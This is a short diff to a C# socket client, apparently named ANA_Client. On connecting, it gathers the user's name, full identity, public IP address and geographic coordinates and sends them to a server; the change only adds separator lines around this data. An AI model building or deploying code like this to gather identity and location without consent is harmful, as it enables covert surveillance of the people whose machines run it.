@@ -4,7 +4,6 @@ using System.Text;
 using System.Management;
 using System.Text.Json;
 using ANA_Client;
-using static System.Net.Mime.MediaTypeNames;
 public class Client
 {
     private Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -17,10 +16,14 @@ public class Client
         {
             socket.Connect(localIpEndPoint);
 
+            _sendingInfos.Add("-- First Infos --");
+
             _sendingInfos.Add($"User Name :  {Environment.UserName}");
             _sendingInfos.Add($"Full Name :  {GetIdentity()}");
             _sendingInfos.Add($"IP Address : {await GetPublicIPAddressAsync()}");
             _sendingInfos.Add($"Coord : {await GetPositionInfo()}");
+
+            _sendingInfos.Add("-----------------");
 
             SendMessageToServer(string.Join("\n", _sendingInfos));
         }
